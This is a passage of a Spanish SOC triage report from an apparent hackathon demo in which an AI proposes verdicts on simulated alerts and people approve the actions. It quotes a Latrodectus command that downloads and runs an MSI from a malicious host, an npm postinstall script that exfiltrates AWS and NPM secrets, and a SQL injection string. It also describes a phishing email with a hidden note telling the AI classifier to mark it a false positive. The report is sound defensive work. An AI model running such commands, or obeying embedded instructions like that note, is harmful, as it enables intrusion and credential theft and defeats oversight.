# Reporte de triaje · 10 alertas de la demo

**Equipo TEMIPO · UAB The Hack 2026 · reto Deloitte**

Generado automáticamente a partir de los resultados reales del sistema (triaje del 2026-11-08 10:25 UTC) con `python -m scripts.reporte_alertas`. Para cada alerta: por qué ha saltado, qué ha investigado el sistema, qué propone la IA, qué decide el código y qué acciones se proponen (contención y escalado) y quién las aprueba.

**Resultado: 5 a N2 · 1 a revisión humana · 4 cerradas.** La IA propone el veredicto y lo argumenta; la gravedad, el escalado y los permisos los calcula el código con la política del SOC; ninguna acción de contención se ejecuta sin una persona.

## Resumen

| # | Alerta | Qué ha pasado | Veredicto | Gravedad | Decisión |
|---|---|---|---|---|---|
| 1 | `ALR-20261009-011791` | Mal Latrodectus (loader y DLL) ejecutado en el portátil de una compradora con beaconing activo | Ataque real | Crítica | Escalar a N2 |
| 2 | `ALR-20261020-011910` | Correo de supuesta factura de Packaging Iberia reportado como phishing por un usuario de Compras | Ataque real | Media | Escalar a N2 |
| 3 | `ALR-20261008-011789` | Correo de suplantación solicitando cambio de IBAN de proveedor por 148.320 € | Ataque real | Alta | Escalar a N2 |
| 4 | `ALR-20261012-011829` | AnyDesk no autorizado en portátil de tienda con sesión entrante y acceso a compartida de cierre | Ataque real | Alta | Escalar a N2 |
| 5 | `ALR-20261013-011901` | Confusión de dependencias en CI-RUNNER01: un paquete npm malicioso lee secretos de despliegue y exfiltra datos | Ataque real | Alta | Escalar a N2 |
| 6 | `ALR-20261011-011877` | Acceso VPN de Logisoft desde Letonia en domingo de madrugada | Falta información (revisión humana) | Media | Revisión humana |
| 7 | `ALR-20261008-011833` | Escaneo de inyección SQL contra la tienda online durante el pentest autorizado | Actividad autorizada | Baja | Cerrar |
| 8 | `ALR-20261005-000395` | PowerShell con comando codificado ejecutado por el agente SCCM en un portátil de HQ | Falsa alarma | Informativa | Cerrar |
| 9 | `ALR-20261005-000043` | Inicio de sesión de Javier Sanz desde Barcelona y luego desde Dublín en menos de 30 minutos | Falsa alarma | Informativa | Cerrar |
| 10 | `ALR-20261005-000456` | Consultas DNS a subdominios largos de avqs.mcafee.com desde un portátil de Barcelona | Falsa alarma | Informativa | Cerrar |

## Alertas del mismo ataque

- `GRP-20261007-011786` · 5 alertas (`ALR-20261007-011786`, `ALR-20261007-011787`, `ALR-20261007-011788`, `ALR-20261007-011785`, `ALR-20261008-011789`) unidas por ips: 203.0.113.45, usuarios: laura.ferrer2@tarvia.example. De estas 10: `ALR-20261008-011789`. Ticket único `TKT-GRP-20261007-011786`, gravedad crítica, escalado a N2.
- `GRP-20261020-011910` · 2 alertas (`ALR-20261020-011910`, `ALR-20261020-011905`) unidas por dominios: packaging-iberia-pagos.example. De estas 10: `ALR-20261020-011910`. Ticket único `TKT-GRP-20261020-011910`, gravedad media, escalado a N2.

## Alerta por alerta

### 1. ALR-20261009-011791 — Mal Latrodectus (loader y DLL) ejecutado en el portátil de una compradora con beaconing activo

**Conclusión: Ataque real · gravedad crítica · Escalar a N2**

**Por qué ha saltado**

- Regla `UC-EDR-001` (Proceso hijo sospechoso de Office o intérprete de scripts) de EDR, gravedad de la regla Alta.
- Word, Excel, wscript o mshta lanzan un proceso inusual.
- Hora de la alerta: 09/10/2026 11:31 (hora de España).

**Qué se ha investigado**

- 28 consultas a la API del SOC: 1 de inventario de equipos, 1 de directorio de personas, 3 de inteligencia, 2 de sandbox, 4 de calendario de cambios, 17 de registros ±24 h (fuentes: dns, edr_events, firewall, proxy).
- Inteligencia de `aplihartom.com`: maliciosa (Latrodectus).
- Inteligencia de `6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466`: desconocida (no es limpia).
- Inteligencia de `0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697`: maliciosa (Latrodectus).
- Equipo `WS-BCN-1770`: Portátil, criticidad media.
- Calendario de cambios: ningún cambio aprobado que lo cubra.

**Qué concluye la IA** (propone; confianza 0.98)

> El portátil de Marta Puig (WS-BCN-1770) ejecutó un vector de ataque real de Latrodectus: un JScript Pedido_Q4_2026.js lanzó msiexec contra https://aplihartom.com/dl/upd.msi, que descargó la DLL sin firma upd_x64.dll y la ejecutó por rundll32 con persistencia en la clave Run de HKCU. El dominio applihartom.com y la DLL están marcados como maliciosos en el TIP de Tarvia, y ambos archivos confirman el mismo familia en sandbox. Además, el proxy muestra beaconing HTTPS POST cada ~60 s contra https://aplihartom.com/live/ desde el propio equipo (203.0.113.88), lo que indica que la actividad no fue bloqueada y hay comunicación con el C2 en curso. No existe ningún cambio aprobado ni flujo autorizado que lo justifique.

Pruebas que cita:

- `EDR-0123400` (edr_events): wscript.exe (hijo de explorer.exe) ejecuta C:\Users\marta.puig\Downloads\Pedido_Q4_2026\Pedido_Q4_2026.js con integridad Media.
- `EDR-0123401` (edr_events): msiexec.exe lanza msiexec.exe /q /i https://aplihartom.com/dl/upd.msi con padre wscript.exe.
- `EDR-0123402` (edr_events): msiexec.exe crea C:\Users\marta.puig\AppData\Roaming\Custom_update\upd_x64.dll sin firma.
- `EDR-0123403` (edr_events): rundll32.exe ejecuta upd_x64.dll con export 'homq' a partir de msiexec.exe.
- `EDR-0123404` (edr_events): rundll32.exe escribe HKCU\...\Run\Update apuntando a la DLL (persistencia confirmada).
- (tip): aplihartom.com está marcado malicious en el TIP (confidence 85, familia Latrodectus, tags c2/loader).

**Qué decide el código** (política del SOC, no la IA)

- Gravedad: Regla alta × criticidad Media = alta. Ajuste +1 (+1: ejecución o acceso confirmado). Final: crítica.
- Escala porque: ataque real de gravedad crítica · ejecución o acceso confirmado.
- Plazo (SLA): triaje en 15 min; Inmediato a N2 de guardia por teléfono; avisar a: Responsable SOC y CISO.

**Acciones (contención y escalado)**

| Acción | Objetivo | Quién la aprueba | Estado |
|---|---|---|---|
| Bloquear indicadores | aplihartom.com, 203.0.113.88, sha256 0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697, sha256  | N1 (sin aprobación previa) | Propuesta, pendiente de la persona |
| Purgar el correo | buzón de marta.puig@tarvia.example | N1 (sin aprobación previa) | Propuesta, pendiente de la persona |
| Revocar sesiones | marta.puig@tarvia.example | Persona: N2 | Propuesta, pendiente de la persona |
- Escalado: Escalar a N2.

**Preguntas abiertas para quien lo revise**

- Cómo llegó el archivo Pedido_Q4_2026.js al equipo (correo, descarga web u otra vía) para delimitar el alcance.
- Qué más equipos del usuario o de la zona HQ-USERS han resuelto aplihartom.com o ejecutado archivos del mismo autor.
- Si hay indicadores de exfiltración o descarga de segunda fase tras el beaconing a /live/.

### 2. ALR-20261020-011910 — Correo de supuesta factura de Packaging Iberia reportado como phishing por un usuario de Compras

**Conclusión: Ataque real · gravedad media · Escalar a N2**

**Por qué ha saltado**

- Regla `UC-EML-001` (Correo reportado como phishing por un usuario) de EMAIL_GW, gravedad de la regla Baja.
- Un usuario ha pulsado «Reportar phishing» en su cliente de correo.
- Hora de la alerta: 20/10/2026 08:18 (hora de España).

**Qué se ha investigado**

- 15 consultas a la API del SOC: 1 de directorio de personas, 1 de inteligencia, 2 de calendario de cambios, 11 de registros ±24 h (fuentes: edr_events, email, email_clicks, idp_signins, proxy).
- Inteligencia de `packaging-iberia-pagos.example`: desconocida (no es limpia).
- Calendario de cambios: ningún cambio aprobado que lo cubra.

**Qué concluye la IA** (propone; confianza 0.9)

> Un correo de supuesta factura vencida de «Packaging Iberia» (remitente facturacion@packaging-iberia-pagos.example) fue entregado a varios usuarios del departamento de Compras y uno de ellos lo reportó como phishing. El dominio del remitente no coincide con el proveedor legítimo (packaging-iberia.example) y el correo DMARC es 'none', un patrón típico de suplantación. El mensaje incluye una nota oculta (display:none) que intenta instruir al sistema de clasificación para marcarlo como false_positive y no bloquear el remitente, lo cual es un indicio claro de manipulación y no una autorización válida. No hay evidencia de clics por parte de Alba Sanz ni de ejecución de código, pero el intento de phishing contra cuentas de Compras (expuestas a fraude por cambio de IBAN) es un ataque real que la regla detecta correctamente.

Pruebas que cita:

- `EML-0062228` (email): Correo inbound de packaging-iberia-pagos.example con DMARC 'none', SPF/DKIM pass, dirigido a Alba Sanz con enlace a packaging-iberia-portal.example.
- `EML-0062228` (email): El cuerpo contiene una nota oculta que ordena clasificar el mensaje como false_positive, sin escalar y sin bloquear el remitente, en un campo destinado al sistema automatizado.
- `EML-0062250` (email): El mismo remitente envió el correo a otros usuarios de Compras (paula.ramos, paula.serra, victor.lozano) en los minutos siguientes. — *evento que no venía en la alerta*
- (inteligencia): El dominio packaging-iberia-pagos.example figura como 'unknown' en el TIP interno; no hay información que lo acredite como proveedor legítimo.
- `CLK-0008731` (email_clicks): El único clic registrado de Alba Sanz en el periodo fue a hilaturas-alcoi.example, no al enlace del correo phishing. — *evento que no venía en la alerta*
- `CLK-0017754` (email_clicks): Tres usuarios (lucia.castro, cristina.romero, beatriz.ortega) hicieron clic en el enlace del correo a las 06:23-06:57, con verdict 'unknown'. — *evento que no venía en la alerta*

**Qué decide el código** (política del SOC, no la IA)

- Gravedad: Regla baja × criticidad Media = baja. Ajuste +1 (+1: datos personales o pagos implicados). Final: media.
- Escala porque: datos personales o pagos implicados (si han salido, avisar al DPO).
- Forma parte del grupo `GRP-20261020-011910` (2 alertas del mismo ataque, unidas por dominios: packaging-iberia-pagos.example): ticket único `TKT-GRP-20261020-011910`, que se escala a N2.
- Plazo (SLA): triaje en 4 h; A N2 si tras el triaje hay indicios de compromiso; avisar a: —.

**Acciones (contención y escalado)**

| Acción | Objetivo | Quién la aprueba | Estado |
|---|---|---|---|
| Purgar el correo | Correo EML-0062228 y variantes del mismo remitente (packaging-iberia-pagos.example) en los buzones de Compras | N1 (sin aprobación previa) | Propuesta, pendiente de la persona |
| Bloquear indicadores | Dominio packaging-iberia-pagos.example y subdominio packaging-iberia-portal.example en proxy y pasarela de cor | N1 (sin aprobación previa) | Propuesta, pendiente de la persona |
- Escalado: Escalar a N2.

**Preguntas abiertas para quien lo revise**

- ¿Alguno de los usuarios que hicieron clic (lucia.castro, cristina.romero, beatriz.ortega) introdujo credenciales o realizó alguna acción en el portal fraudulento?
- ¿El proveedor legítimo packaging-iberia.example ha facturado realmente a Tarvia con esta referencia (FV-2026-10-8812) o el dominio es pura suplantación?
- ¿Hay actividad posterior de estos usuarios hacia dominios o IBANes no habituales que indiquen fraude exitoso?

### 3. ALR-20261008-011789 — Correo de suplantación solicitando cambio de IBAN de proveedor por 148.320 €

**Conclusión: Ataque real · gravedad alta · Escalar a N2**

**Por qué ha saltado**

- Regla `UC-EML-004` (Petición de cambio de datos bancarios por correo) de EMAIL_GW, gravedad de la regla Media.
- Correo interno o externo que solicita modificar un IBAN de proveedor o empleado.
- Hora de la alerta: 08/10/2026 10:19 (hora de España).

**Qué se ha investigado**

- 22 consultas a la API del SOC: 2 de directorio de personas, 1 de inteligencia, 3 de calendario de cambios, 16 de registros ±24 h (fuentes: edr_events, email, email_clicks, idp_signins, proxy).
- Inteligencia de `203.0.113.45`: desconocida (no es limpia); GeoIP: Ámsterdam, NL, Hosting Ámsterdam BV (simulado), hosting.
- Calendario de cambios: ningún cambio aprobado que lo cubra.

**Qué concluye la IA** (propone; confianza 0.92)

> Una alerta de pasarela de correo detecta un intento de fraude por cambio de IBAN (BEEF/whaling financiero) dirigido a Jordi Serra (DPO) en nombre de Laura Ferrer (E-commerce). El correo, enviado desde la IP 203.0.113.45 (hosting en Ámsterdam, sin inteligencia de amenaza pero no legítima de Tarvia), solicita actualizar el IBAN de Textiles Montroig a una cuenta de Letonia (LT) para un pago de 148.320,00 € antes del viernes, con un PDF adjunto de «certificado de titularidad». La regla acierta: es una solicitud real de modificación de datos bancarios de proveedor, un ataque en curso aunque ningún control lo haya bloqueado. No existe autorización citable y el DPO destinatario está de vacaciones solo a partir del 26/10, sin relación con este correo del 8/10.

Pruebas que cita:

- `EML-0062205` (alerta): El correo EML-0062205, de laura.ferrer2@tarvia.example a jordi.serra2@tarvia.example, pide actualizar el IBAN de Textiles Montroig a LT12 3250 0000 1234 5678 antes del pago del viernes; adjunta un PDF de «certificado de titularidad».
- `EML-0062205` (email): El remitente usa una IP de hosting en Ámsterdam (203.0.113.45) aunque SPF/DKIM/DMARC dan pass, lo que sugiere suplantación del dominio y no un envío legítimo interno.
- `EML-0010743` (email): Jorges recibió el 8/10 a las 05:46 una factura real de Textiles Montroig (facturacion@textiles-montroig.example), lo que da contexto pero no autoriza ningún cambio de IBAN. — *evento que no venía en la alerta*

**Qué decide el código** (política del SOC, no la IA)

- Gravedad: Regla media × criticidad Media = media. Ajuste +1 (+1: ejecución o acceso confirmado; +1: datos personales o pagos implicados). Final: alta.
- Escala porque: ataque real de gravedad alta · ejecución o acceso confirmado · datos personales o pagos implicados (si han salido, avisar al DPO) · posible fraude económico.
- Forma parte del grupo `GRP-20261007-011786` (5 alertas del mismo ataque, unidas por ips: 203.0.113.45, usuarios: laura.ferrer2@tarvia.example): ticket único `TKT-GRP-20261007-011786`, que se escala a N2.
- Plazo (SLA): triaje en 30 min; A N2 en la misma jornada; avisar a: Responsable SOC.

**Acciones (contención y escalado)**

| Acción | Objetivo | Quién la aprueba | Estado |
|---|---|---|---|
| Bloquear indicadores | 203.0.113.45 | N1 (sin aprobación previa) | Propuesta, pendiente de la persona |
| Purgar el correo | <CAF8x9-bec-0001@tarvia.example> | N1 (sin aprobación previa) | Propuesta, pendiente de la persona |
| Bloquear indicadores | LT12 3250 0000 1234 5678 | N1 (sin aprobación previa) | Propuesta, pendiente de la persona |
- Escalado: Escalar a N2.

**Preguntas abiertas para quien lo revise**

- ¿Se ha contactado con Textiles Montroig por otro canal para confirmar si realmente cambió de cuenta bancaria antes de que Tesorería procese cualquier pago?
- ¿Hay registros de que el correo haya sido abierto o que el enlace/archivo adjunto haya sido interactuado por el destinatario (email_clicks)?
- ¿Existe algún correo previo o posterior de Textiles Montroig que confirme o refute un cambio real de IBAN?

### 4. ALR-20261012-011829 — AnyDesk no autorizado en portátil de tienda con sesión entrante y acceso a compartida de cierre

**Conclusión: Ataque real · gravedad alta · Escalar a N2**

**Por qué ha saltado**

- Regla `UC-EDR-005` (Herramienta de acceso remoto no autorizada) de EDR, gravedad de la regla Media.
- Ejecución de AnyDesk, TeamViewer personal u otras RMM no aprobadas.
- Hora de la alerta: 12/10/2026 16:11 (hora de España).

**Qué se ha investigado**

- 25 consultas a la API del SOC: 1 de inventario de equipos, 1 de directorio de personas, 2 de inteligencia, 1 de sandbox, 4 de calendario de cambios, 16 de registros ±24 h (fuentes: dns, edr_events, firewall, proxy).
- Inteligencia de `198.51.100.210`: desconocida (no es limpia); GeoIP: Casablanca, MA, Proveedor móvil (simulado).
- Inteligencia de `a6a536a710731876ce49160473bc55b5a4143dd66a0695acd3cf9e8c716af333`: desconocida (no es limpia).
- Equipo `LT-T07-02`: Portátil, criticidad media.
- Calendario de cambios: ningún cambio aprobado que lo cubra.

**Qué concluye la IA** (propone; confianza 0.9)

> La dependienta Andrea Molina ejecutó AnyDesk (herramienta de acceso remoto no aprobada en Tarvia) en el portátil LT-T07-02 de la Tienda 07, tras descargarlo desde download.anydesk.com minutos antes. Se estableció una sesión de control remoto entrante desde una IP de Marruecos (198.51.100.210) y, desde el propio AnyDesk, se lanzó PowerShell para recorrer el recurso compartido \\FS01\Tiendas\Cierres. No existe ningún cambio aprobado ni flujo que autorice el uso de AnyDesk, y la única RMM permitida es TeamViewer Corporate gestionado por IT. La actividad se ejecutó sin que ningún control la bloqueara, por lo que constituye un intento de acceso remoto no autorizado con posible exfiltración de datos de cierre de tienda.

Pruebas que cita:

- `EDR-0123426` (edr_events): AnyDesk.exe (firmado por AnyDesk Software GmbH) se ejecutó desde C:\Users\andrea.molina\Downloads\, con padre msedge.exe.
- `PRX-0212611` (proxy): Se descargó AnyDesk.exe (5,1 MB) desde download.anydesk.com a las 14:02, tres minutos antes de su ejecución.
- `EDR-0123427` (edr_events): AnyDesk.exe estableció conexión entrante de control remoto desde 198.51.100.210 (Casablanca, Marruecos), un proveedor móvil con proxy residencial.
- `EDR-0123428` (edr_events): PowerShell lanzado como hijo de AnyDesk ejecutó Get-ChildItem \\FS01\Tiendas\Cierres -Recurse, accediendo a datos de cierre de tiendas.
- (inteligencia): La IP 198.51.100.210 está como unknown y procede de Marruecos; el hash de AnyDesk.exe es unknown pero el sandbox lo confirma como binario legítimo (no malicioso en sí).
- (activos): LT-T07-02 es un portátil de tienda (criticalidad Media), sin autorización para RMM no controladas por IT.

**Qué decide el código** (política del SOC, no la IA)

- Gravedad: Regla media × criticidad Media = media. Ajuste +1 (+1: ejecución o acceso confirmado). Final: alta.
- Escala porque: ataque real de gravedad alta · ejecución o acceso confirmado.
- Plazo (SLA): triaje en 30 min; A N2 en la misma jornada; avisar a: Responsable SOC.

**Acciones (contención y escalado)**

| Acción | Objetivo | Quién la aprueba | Estado |
|---|---|---|---|
| Bloquear indicadores | 198.51.100.210 y download.anydesk.com en proxy/EDR | Persona: N2 | Propuesta, pendiente de la persona |
| Purgar el correo |  | N1 (sin aprobación previa) | Propuesta, pendiente de la persona |
| Desactivar la clave |  | Persona: N2 | Propuesta, pendiente de la persona |
- Escalado: Escalar a N2.

**Preguntas abiertas para quien lo revise**

- Existe algún ticket de IT o solicitud legítima pendiente que justifique el uso de AnyDesk por parte de la dependienta?
- Qué datos se leyeron realmente de \\FS01\Tiendas\Cierres y ha habido transferencia saliente (posible exfiltración)?
- La sesión entrante desde Marruecos sigue activa o ya se ha cerrado? Hay actividad posterior del proceso AnyDesk.

### 5. ALR-20261013-011901 — Confusión de dependencias en CI-RUNNER01: un paquete npm malicioso lee secretos de despliegue y exfiltra datos

**Conclusión: Ataque real · gravedad alta · Escalar a N2**

**Por qué ha saltado**

- Regla `UC-DEV-001` (Dependencia con script de instalación que accede a secretos o a red) de CICD, gravedad de la regla Media.
- Durante un build, un script postinstall lee variables de entorno sensibles o conecta a un dominio nuevo.
- Hora de la alerta: 13/10/2026 14:26 (hora de España).

**Qué se ha investigado**

- 17 consultas a la API del SOC: 1 de inventario de equipos, 2 de inteligencia, 1 de sandbox, 3 de calendario de cambios, 10 de registros ±24 h (fuentes: cicd_builds, cloudtrail, firewall, proxy).
- Inteligencia de `npm-telemetry-stats.example`: desconocida (no es limpia).
- Inteligencia de `f412c70fef24e226c48b62c885087042fb88ddae0df4f4d5386f4b48156a676c`: desconocida (no es limpia).
- Equipo `CI-RUNNER01`: Runner CI/CD, criticidad alta.
- Calendario de cambios: ningún cambio aprobado que lo cubra.

**Qué concluye la IA** (propone; confianza 0.95)

> Durante el build ecom-frontend#1842 en CI-RUNNER01, el paquete tarvia-checkout-utils@9.9.1 (registro público npm) se instaló en lugar de @tarvia/checkout-utils@2.3.0 (registro interno), un caso clásico de dependency confusion. El script postinstall node scripts/telemetry.js leyó las variables de entorno AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, NPM_TOKEN y SENTRY_DSN, y envió 2,150 bytes por HTTPS a npm-telemetry-stats.example (203.0.113.170). El sandbox confirmó el paquete como malicioso (confusión de dependencias, puntuación 90/100) con las mismas señales de exfiltración. El runner CI-RUNNER01 es un activo de criticidad alta que contiene en variables de entorno la clave de despliegue de AWS (svc_ecom_deploy), por lo que es muy probable que las credenciales de AWS hayan quedado expuestas. La alerta es correcta y la actividad es maliciosa real; el firewall permitió la salida, por lo que no hubo contención.

Pruebas que cita:

- `CI-0000602` (cicd_builds): En el step npm ci se instaló tarvia-checkout-utils@9.9.1 desde registry.npmjs.org (público) cuando se esperaba @tarvia/checkout-utils 2.3.0 (registro interno), con sha256 f412c70f...a676c y postinstall node scripts/telemetry.js.
- `CI-0000603` (cicd_builds): El postinstall del paquete leyó AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, NPM_TOKEN y SENTRY_DSN, y ejecutó un POST https://npm-telemetry-stats.example/collect de 2,1 KB.
- `FW-0026595` (firewall): El firewall permitió (allow) la salida desde CI-RUNNER01 (172.16.10.21) a 203.0.113.170:443 por la regla AWS-CI-EGress, transfiriendo 2,150 bytes a EXTERNAL.
- `f412c70fef24e226c48b62c885087042fb88ddae0df4f4d5386f4b48156a676c` (sandbox): El sandbox clasificó el tgz como malicioso (confusión de dependencias, score 90): postinstall lee variables AWS_* y NPM_TOKEN y envía un JSON por HTTPS POST a npm-telemetry-stats.example (203.0.113.170).
- `A01175` (evidencia): CI-RUNNER01 es un runner de criticidad alta en AWS-PROD que ejecuta los builds de la tienda online y contiene en variables de entorno la clave de despliegue de AWS (svc_ecom_deploy).
- `npm-telemetry-stats.example` (evidencia): La inteligencia de amenazas marca el dominio como unknown (sin información), y los cambios aprobados del entorno están vacíos, descartando una autorización citable.

**Qué decide el código** (política del SOC, no la IA)

- Gravedad: Regla media × criticidad Alta = media. Ajuste +1 (+1: ejecución o acceso confirmado; +1: identidad VIP o privilegiada). Final: alta.
- Escala porque: ataque real de gravedad alta · ejecución o acceso confirmado.
- Plazo (SLA): triaje en 30 min; A N2 en la misma jornada; avisar a: Responsable SOC.

**Acciones (contención y escalado)**

| Acción | Objetivo | Quién la aprueba | Estado |
|---|---|---|---|
| Bloquear indicadores | npm-telemetry-stats.example y 203.0.113.170 en proxy, correo y EDR | N1 (sin aprobación previa) | Propuesta, pendiente de la persona |
| Revocar sesiones | Credenciales de despliegue AWS (svc_ecom_deploy) en CI-RUNNER01 | Persona: N2 | Propuesta, pendiente de la persona |
| Desactivar la clave | Claves de acceso AWS asociadas al runner y rotación del NPM_TOKEN | Persona: N2 | Propuesta, pendiente de la persona |
- Escalado: Escalar a N2.

**Preguntas abiertas para quien lo revise**

- ¿Se ha rotado ya la clave de despliegue AWS (svc_ecom_deploy) y el NPM_TOKEN expuestos en el runner?
- ¿Hay actividad posterior sospechosa desde CI-RUNNER01 o desde la cuenta de despliegue AWS tras el POST del 13-10 a las 12:22?
- ¿Qué permisos tenía la clave svc_ecom_deploy en tarvia-prod y se ha detectado uso no autorizado tras la exfiltración?
- ¿Se ha revisado si el paquete malicioso dejó persistencia o si otros builds consumieron tarvia-checkout-utils@9.9.1?

### 6. ALR-20261011-011877 — Acceso VPN de Logisoft desde Letonia en domingo de madrugada

**Conclusión: Falta información (revisión humana) · gravedad media · Revisión humana**

**Por qué ha saltado**

- Regla `UC-VPN-001` (Acceso VPN de proveedor fuera de horario o desde origen nuevo) de VPN, gravedad de la regla Baja.
- Cuenta de tercero conectada fuera de su ventana contractual o desde un ASN no visto.
- Hora de la alerta: 11/10/2026 03:40 (hora de España).

**Qué se ha investigado**

- 14 consultas a la API del SOC: 1 de directorio de personas, 1 de inteligencia, 2 de calendario de cambios, 10 de registros ±24 h (fuentes: ad_events, firewall, idp_audit, idp_signins, vpn).
- Inteligencia de `77.90.185.20`: desconocida (no es limpia); GeoIP: Vilna, LT, Limited Network LTD, hosting.
- Calendario de cambios: CHG-2026-1071.

**Qué concluye la IA** (propone; confianza 0.45)

> La cuenta de proveedor ext.logisoft se conectó por VPN el domingo 11-oct a las 03:38 hora local (01:38 UTC) desde Vilna, Letonia (AS213790, Limited Network LTD), un origen no visto y fuera de su ventana contractual (lunes a viernes 8-18 h). La autenticación con TOTP fue aprobada, pero el dispositivo no es conforme (device_compliant=false) y el acceso se dirigió a WMS01 (10.40.2.10:3389) con 9 MB transmitidos. El único cambio aprobado (CHG-2026-1071) cubre una actualización del WMS el 16-oct, por lo que NO autoriza este acceso del 11-oct. La evidencia es contradictoria: el ASN figura como hosting y el evento de desconexión muestra un país distinto (Bulgaria), lo que sugiere posible suplantación del origen. No hay evidencia de actividad posterior ni de exfiltración, pero tampoco se descarta compromiso.

Pruebas que cita:

- `VPN-0010704` (alerta): Evento VPN real: ext.logisoft se conecta a las 01:38 UTC desde 77.90.185.20 (Letonia) con MFA TOTP aprobado y device_compliant=false
- `FW-0026536` (alerta): Firewall real: desde la IP asignada 10.99.60.10 se permite RDP (3389) hacia WMS01 (10.40.2.10) con 9.000.000 bytes transmitidos en zona LOGISTICS-IT
- `SIGN-0084059` (alerta): IdP real: inicio de sesión VPN exitoso desde Vilna, Letonia, con MFA TOTP aprobado, device_compliant=false y conditional_access notApplied — *evento que no venía en la alerta*
- `VPN-0010705` (alerta): Evento de desconexión a las 04:48 UTC desde la misma IP pero con país Bulgaria y 55 MB descargados, lo que contradice el origen reportado y sugiere posible manipulación del origen — *evento que no venía en la alerta*
- `CHG-2026-1071` (cambios_aprobados): Existe un cambio aprobado para acceso de Logisoft fuera de horario, pero cubre el 16-oct 21:00-23:59, no el 11-oct de la alerta
- `77.90.185.20` (inteligencia): La IP 77.90.185.20 es de AS213790 (Limited Network LTD), clasificada como hosting, no como proveedor de VPN ni TOR, sin marcadores maliciosos conocidos

**Qué decide el código** (política del SOC, no la IA)

- Gravedad: Regla baja × criticidad Media = baja. Ajuste +1 (+1: ejecución o acceso confirmado). Final: media.
- Plazo (SLA): triaje en 4 h; A N2 si tras el triaje hay indicios de compromiso; avisar a: —.

**Acciones (contención y escalado)**

- Sin contención propuesta: la decide la persona tras revisarla.
- Escalado: Revisión humana.

**Preguntas abiertas para quien lo revise**

- ¿Es legítimo el acceso del domingo desde Letonia con un dispositivo no conforme, o la cuenta ext.logisoft ha sido comprometida?
- ¿Por qué el evento de desconexión muestra Bulgaria mientras la conexión se atribuye a Letonia?
- ¿Qué actividad real realizó ext.logisoft en WMS01 durante la sesión (archivos consultados, cambios)?
- ¿El dispositivo no conforme y el conditional_access no aplicado violan la política de acceso de Tarvia?

### 7. ALR-20261008-011833 — Escaneo de inyección SQL contra la tienda online durante el pentest autorizado

**Conclusión: Actividad autorizada · gravedad baja · Cerrar**

**Por qué ha saltado**

- Regla `UC-WEB-001` (Ataque de inyección contra aplicación web) de WAF, gravedad de la regla Baja.
- Firma SQLi/XSS/LFI en el WAF.
- Hora de la alerta: 08/10/2026 08:59 (hora de España).

**Qué se ha investigado**

- 15 consultas a la API del SOC: 2 de inteligencia, 2 de calendario de cambios, 11 de registros ±24 h (fuentes: ecom_account, ecom_auth, waf).
- Inteligencia de `192.0.2.11`: desconocida (no es limpia); GeoIP: Madrid, ES, Auditora externa (pentest autorizado, simulado), hosting.
- Inteligencia de `www.tarvia.example`: desconocida (no es limpia).
- Calendario de cambios: CHG-2026-1042.

**Qué concluye la IA** (propone; confianza 0.97)

> El WAF bloqueó 56 intentos de inyección SQL (firma 942100) contra https://www.tarvia.example/api/v1/products?cat=12' OR '1'='1 procedentes de 192.0.2.11, con user_agent 'pentest-auditoria-tarvia'. La IP pertenece a la auditoria externa (AS64620, descrita como pentest autorizado, simulado) y cae dentro del cambio aprobado CHG-2026-1042, que autoriza el escaneo de www.tarvia.example y la API desde las IPs 192.0.2.10-12 del 8 al 10 de octubre. No hay autenticación ni acceso a la aplicación (0 eventos en ecom_auth/ecom_account) y todas las peticiones fueron bloqueadas (403) sin actividad posterior, por lo que es actividad de auditoria autorizada y no compromiso.

Pruebas que cita:

- `WAF-0074548` (waf): Peticiones GET con uri de inyección SQL, status 403, action blocked y user_agent 'pentest-auditoria-tarvia' desde 192.0.2.11.
- `192.0.2.11` (inteligencia): La IP origen es AS64620, identificada como auditoria externa (pentest autorizado, simulado), desde Madrid, España.
- `CHG-2026-1042` (cambios_aprobados): Cambio aprobado que autoriza el pentest de la tienda online y la API desde las IPs 192.0.2.10-12 del 2026-10-08 08:00 al 2026-10-10 18:00, alcanzando www.tarvia.example y api.
- `ecom_auth` (contexto_logs): 0 eventos de autenticación y 0 de cuenta de usuario desde 192.0.2.11: no hubo login ni acceso a la aplicación.
- `waf` (contexto_logs): Continuidad de peticiones bloqueadas (403) de la misma IP y firma tras la alerta, sin cambios de estado ni actividad posterior.

**Qué decide el código** (política del SOC, no la IA)

- Gravedad: Actividad autorizada (CHG-2026-1042: Pentest externo de la tienda online (2026-10-08 08:00 – 2026-10-10 18:00)): la política la deja en baja (la matriz daría media).
- Autorización verificada (fecha y origen): CHG-2026-1042: Pentest externo de la tienda online (2026-10-08 08:00 – 2026-10-10 18:00).
- Plazo (SLA): triaje en 24 h; No; avisar a: —.

**Acciones (contención y escalado)**

- No se propone contención.
- Escalado: Cerrar.

**Preguntas abiertas para quien lo revise**

- Verificar en el informe del pentest que el alcance incluye explícitamente el parámetro 'cat' del endpoint /api/v1/products para descartar escaneo fuera de alcance.

### 8. ALR-20261005-000395 — PowerShell con comando codificado ejecutado por el agente SCCM en un portátil de HQ

**Conclusión: Falsa alarma · gravedad informativa · Cerrar**

**Por qué ha saltado**

- Regla `UC-EDR-002` (PowerShell con comando codificado) de EDR, gravedad de la regla Media.
- Ejecución de PowerShell con -EncodedCommand.
- Hora de la alerta: 05/10/2026 08:04 (hora de España).

**Qué se ha investigado**

- 8 consultas a la API del SOC: 1 de inventario de equipos, 2 de calendario de cambios, 5 de registros ±24 h (fuentes: dns, edr_events, firewall, proxy).
- Equipo `WS-BCN-1993`: Portátil, criticidad media.
- Calendario de cambios: ningún cambio aprobado que lo cubra.

**Qué concluye la IA** (propone; confianza 0.95)

> La regla UC-EDR-002 detectó una ejecución de PowerShell con -EncodedCommand en el portátil WS-BCN-1993, pero el proceso fue iniciado por CcmExec.exe (el agente del cliente de Configuration Manager/SCCM) ejecutando como NT AUTHORITY\SYSTEM. El comando descodificado es una consulta rutinaria de inventario de software (Get-CimInstance Win32_Product volcada a C:\Windows\CCM\Inventory\sw.json), que es exactamente la función para la que funciona el agente SCCM. No existe ningún cambio aprobado ni flujo autorizado citable, por lo que corresponde un false_positive: la actividad es legítima y administrativa, no un ataque. El contexto del host confirma uso normal del usuario (Office, Chrome, Teams, SharePoint, Salesforce) y no hay tráfico sospechoso ni actividad posterior.

Pruebas que cita:

